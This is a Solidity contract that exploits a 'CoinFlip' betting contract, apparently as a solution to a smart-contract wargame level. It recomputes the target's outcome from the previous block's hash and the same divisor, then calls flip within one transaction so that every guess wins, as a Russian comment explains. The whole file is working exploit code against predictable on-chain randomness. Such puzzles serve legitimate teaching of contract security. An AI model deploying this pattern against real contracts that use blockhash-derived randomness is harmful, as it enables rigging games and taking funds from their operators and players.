// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttack {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip public immutable target;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    // считаем угадку и вызываем flip в ОДНОЙ транзакции => один блок => всегда верно
    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = (blockValue / FACTOR) == 1;
        target.flip(side);
    }

    function wins() external view returns (uint256) {
        return target.consecutiveWins();
    }
}
